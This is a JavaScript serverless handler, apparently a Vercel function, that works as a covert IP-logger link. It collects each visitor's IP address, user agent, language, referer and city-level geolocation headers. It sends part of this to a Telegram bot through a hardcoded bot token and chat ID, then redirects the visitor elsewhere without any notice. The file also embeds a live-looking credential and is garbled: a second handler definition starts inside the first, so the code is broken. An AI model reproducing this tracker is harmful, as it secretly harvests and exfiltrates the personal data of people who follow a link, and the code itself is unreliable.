export default async function handler(req, res) {
  const metadata = {
    timestamp: new Date().toISOString(),
 // verificacion de undertrap argentino
    ip:
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown",

     // backend administracion


    
    userAgent: req.headers["user-agent"] || "unknown",

   
    acceptLanguage: req.headers["accept-language"] || "unknown",

    
    country: req.headers["x-vercel-ip-country"] || "unknown",
    region: req.headers["x-vercel-ip-country-region"] || "unknown",
    city: req.headers["x-vercel-ip-city"] || "unknown",
    latitude: req.headers["x-vercel-ip-latitude"] || "unknown",
    longitude: req.headers["x-vercel-ip-longitude"] || "unknown",

 
    referer: req.headers["referer"] || "unknown",
    forwardedFor: req.headers["x-forwarded-for"] || "unknown"
  };

  
  console.log("PALERMO_CODEINA_CLICK", metadata);

  export default async function handler(req, res) {
  const BOT_TOKEN = "8122538107:AAHuk_4KHP05sYxeAemEaw4ehxGJxXBk9Rg";
  const CHAT_ID = "7344446184";

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "unknown";

  const lang = req.headers["accept-language"] || "unknown";
  const ua = req.headers["user-agent"] || "unknown";

  const message = `
🚪 Nuevo click ENTER
🕒 ${new Date().toISOString()}
🌐 IP: ${ip}
🗣 Lang: ${lang}
💻 UA: ${ua}
  `;

  // palermocodeinaadministracion
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });

  // Redirect fijo 
  res.writeHead(302, {
    Location: "https://palermocodeina.vercel.app/"
  });
  res.end();
}
